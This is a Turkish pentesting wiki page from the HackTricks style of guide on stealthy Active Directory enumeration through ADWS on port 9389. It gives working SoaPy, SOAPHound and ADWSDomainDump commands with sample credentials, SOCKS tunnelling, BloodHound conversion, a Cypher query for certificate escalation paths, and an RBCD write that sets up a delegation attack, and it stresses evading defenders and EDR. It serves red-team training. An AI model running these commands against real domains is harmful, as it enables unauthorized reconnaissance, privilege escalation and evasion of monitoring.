# Active Directory Web Services (ADWS) Keşfi ve Gizli Toplama

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak etkinleştirilir** ve TCP **9389** üzerinde dinler. İsimden farklı olarak, **HTTP ile hiçbir ilişkisi yoktur**. Bunun yerine servis, LDAP-benzeri veriyi .NET'e özgü bir dizi framing protokolü üzerinden sunar:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Trafik bu ikili SOAP çerçeveleri içinde kapsüllenip nadir kullanılan bir port üzerinden aktığı için, **ADWS üzerinden yapılan keşifler klasik LDAP/389 & 636 trafiğine kıyasla çok daha az denetlenir, filtrelenir veya imzalanır**. Operatörler için bunun anlamı:

* Daha gizli keşif — Blue teams genellikle LDAP sorgularına odaklanır.
* SOCKS proxy üzerinden 9389/TCP tünelleme ile **non-Windows host'lardan (Linux, macOS)** veri toplanabilme özgürlüğü.
* LDAP ile elde edeceğiniz aynı veriler (users, groups, ACLs, schema, vb.) ve **yazma** yapabilme yeteneği (ör. `msDs-AllowedToActOnBehalfOfOtherIdentity` için **RBCD**).

ADWS etkileşimleri WS-Enumeration üzerinden gerçekleştirilir: her sorgu LDAP filter/atribütlerini tanımlayan bir `Enumerate` mesajı ile başlar ve bir `EnumerationContext` GUID döner, ardından sunucu-tanımlı sonuç penceresine kadar akış yapan bir veya daha fazla `Pull` mesajı gelir. Context'ler ~30 dakika sonra zaman aşımına uğrar, bu yüzden araçlar sonuçları sayfalamalı veya durum kaybını önlemek için filtreleri bölmelidir (CN başına prefix sorguları). Güvenlik tanımlayıcıları istendiğinde, SACL'leri atlamak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin; aksi halde ADWS SOAP yanıtından `nTSecurityDescriptor` atribütünü basitçe düşürür.

> NOTE: ADWS ayrıca birçok RSAT GUI/PowerShell aracı tarafından kullanıldığından, trafik meşru admin aktiviteleriyle karışabilir.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) **ADWS protokol yığınına saf Python ile tam bir yeniden-implementasyon** sağlar. NBFX/NBFSE/NNS/NMF çerçevelerini byte-for-byte oluşturarak .NET runtime'a dokunmadan Unix-benzeri sistemlerden veri toplama imkanı verir.

### Temel Özellikler

* **SOCKS** üzerinden proxy desteği (C2 implantlarından kullanışlı).
* LDAP `-q '(objectClass=user)'` ile özdeş ince taneli arama filtreleri.
* Opsiyonel **write** işlemleri (`--set` / `--delete`).
* **BOFHound output mode** ile doğrudan BloodHound'a ingest edilebilen çıktı.
* İnsan okunurluğu gerektiğinde zaman damgalarını / `userAccountControl`'ü güzelleştiren `--parse` flag'i.

### Hedefe yönelik toplama bayrakları & yazma işlemleri

SoaPy, ADWS üzerinden en yaygın LDAP avcılık görevlerini yeniden üreten derlenmiş switch'lerle gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, artı özel çekimler için ham `--query` / `--filter` seçenekleri. Bunları `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (hedefe yönelik Kerberoasting için SPN staging) ve `--asrep` ( `userAccountControl` içindeki `DONT_REQ_PREAUTH`'ı flip'leme) gibi yazma ilkelikleriyle eşleştirebilirsiniz.

Aşağıda yalnızca `samAccountName` ve `servicePrincipalName` döndüren hedefe yönelik SPN taraması örneği:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Aynı host/kimlik bilgilerini kullanarak bulguları hemen silahlandırın: RBCD yetenekli nesneleri `--rbcds` ile dökün, ardından Resource-Based Constrained Delegation zinciri oluşturmak için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam kötüye kullanım yolu için bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Kurulum (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump ADWS üzerinden (Linux/Windows)

* `ldapdomaindump`'un fork'u; LDAP sorgularını TCP/9389 üzerindeki ADWS çağrılarıyla değiştirir ve böylece LDAP-signature tespitlerini azaltır.
* Port 9389'a ilk erişilebilirlik kontrolü yapar; `--force` verilirse bu atlanır (port taramaları gürültülü/filtreliyse probe atlanır).
* Microsoft Defender for Endpoint ve CrowdStrike Falcon üzerinde test edilmiş olup README'de başarılı bypass gösterilmektedir.

### Kurulum
```bash
pipx install .
```
### Kullanım
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipik çıktı, 9389 erişilebilirlik kontrolünü, ADWS bind'ini ve dump başlangıç/bitişini kaydeder:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - ADWS için Golang'de pratik bir istemci

soapy ile benzer şekilde, [sopa](https://github.com/Macmod/sopa) ADWS protokol yığını (MS-NNS + MC-NMF + SOAP) ni Golang'de uygular ve şu gibi ADWS çağrılarını yapmak için komut satırı bayrakları sunar:

* **Nesne arama ve alma** - `query` / `get`
* **Nesne yaşam döngüsü** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Öznitelik düzenleme** - `attr [add|replace|delete]`
* **Hesap yönetimi** - `set-password` / `change-password`
* ve diğerleri, ör. `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, vb.

## SOAPHound – Yüksek Hacimli ADWS Toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) tüm LDAP etkileşimlerini ADWS içinde tutan ve BloodHound v4-uyumlu JSON üreten .NET tabanlı bir toplayıcıdır. Bir kez `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass` için tam bir önbellek oluşturur (`--buildcache`), sonra yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD-integrated DNS) işlemleri için bunu yeniden kullanır; böylece DC'den sadece ~35 kritik öznitelik çıkar. AutoSplit (`--autosplit --threshold <N>`) büyük ortamlarda EnumerationContext'in 30 dakikalık zaman aşımı altında kalmak için sorguları CN ön eki bazında otomatik olarak parçalar.

Etki alanına katılmış bir operator VM üzerinde tipik iş akışı:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Dışa aktarılan JSON slotlarını doğrudan SharpHound/BloodHound iş akışlarına aktarın—aşağıdaki grafikleme fikirleri için [BloodHound methodology](bloodhound.md) bakın. AutoSplit, SOAPHound'u milyonlarca nesne içeren ormanlarda dayanıklı kılar ve sorgu sayısını ADExplorer-style snapshots'lara göre daha düşük tutar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, ADWS üzerinden **domain & ADCS objects**'ı enumerate etme, bunları BloodHound JSON'a dönüştürme ve certificate-based attack paths için arama yapma adımlarını — hepsi Linux'tan — gösterir:

1. **Tunnel 9389/TCP** hedef ağdan kendi makinenize tünelleyin (ör. Chisel, Meterpreter, SSH dynamic port-forward vb.).  `export HTTPS_PROXY=socks5://127.0.0.1:1080` komutunu çalıştırın veya SoaPy’nin `--proxyHost/--proxyPort` parametrelerini kullanın.

2. **Kök domain nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i yükleyin** BloodHound GUI'de ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırarak sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarın.

### Yazma `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Bunu `s4u2proxy`/`Rubeus /getticket` ile birleştirerek tam bir **Resource-Based Constrained Delegation** zinciri oluşturun (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS keşfi | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Yüksek hacimli ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Sertifika ele geçirilmesi | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS keşfi ve nesne değişiklikleri | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Referanslar

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
